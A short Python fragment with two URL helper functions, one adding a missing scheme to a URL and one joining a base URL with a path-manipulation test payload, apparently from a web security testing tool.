def normalize_url(url: str) -> str:
    if not url:
        return url
    parsed = urlparse(url)
    if not parsed.scheme:
        return "http://" + url
    return url


def build_payload_url(base_url: str, payload: str) -> str:
    """Build a test URL from a base URL and a path-manipulation payload."""
    if payload.startswith(("http://", "https://")):
        return payload
    if payload.startswith(("?", "#")):
        return base_url.rstrip("/") + payload
    return f"{base_url.rstrip('/')}/{payload.lstrip('/')}"


